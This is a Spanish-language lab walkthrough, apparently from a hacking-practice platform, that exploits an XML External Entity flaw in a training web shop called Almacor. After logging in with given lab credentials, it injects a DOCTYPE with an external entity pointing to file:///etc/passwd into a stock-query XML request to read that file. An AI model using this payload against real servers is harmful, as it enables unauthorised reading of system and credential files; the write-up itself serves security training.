---
title: Recupera un fichero del servidor con XXE (Almacor)
date: 2026-10-23
mermaid: true
categories: [ZHacksLabs, "XML External Entity"]
tags: ["XXE"]
---

Vamos ver la aplicación web:

![](/assets/images/zh/xxe/recuperar-un-fichero-del-servidor-con-xxe-almacor/1.png)

Vamos a darle a `Entrar panel` donde nos darán las siguientes credenciales de acceso:
- `n.duran`:`Almacor-2026`

Vamos a iniciar sesión:

![](/assets/images/zh/xxe/recuperar-un-fichero-del-servidor-con-xxe-almacor/2.png)

Vemos que podemos consultar el stock, vamos a probarlo:

![](/assets/images/zh/xxe/recuperar-un-fichero-del-servidor-con-xxe-almacor/3.png)

Vamos a ver que petición a realizado:

![](/assets/images/zh/xxe/recuperar-un-fichero-del-servidor-con-xxe-almacor/4.png)

Vemos que para tramitar los datos usa XML, pasando todo el documento. Vamos a intentar crear un nuevo **Document Type Definition** *(DTD)* donde definiremos una nueva entidad externa donde use el esquema de URL `file://` apuntando al `/etc/passwd`:

*Payload*:
```xml
<!DOCTYPE test [<!ENTITY data SYSTEM "file:///etc/passwd">]>
```

Ahora lo añadiremos al documento XML y sustituiremos el valor de `<ref>` por el valor de nuestra entidad `&data;`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY data SYSTEM "file:///etc/passwd">]>
<consulta><ref>&data;</ref></consulta
```

![](/assets/images/zh/xxe/recuperar-un-fichero-del-servidor-con-xxe-almacor/5.png)

---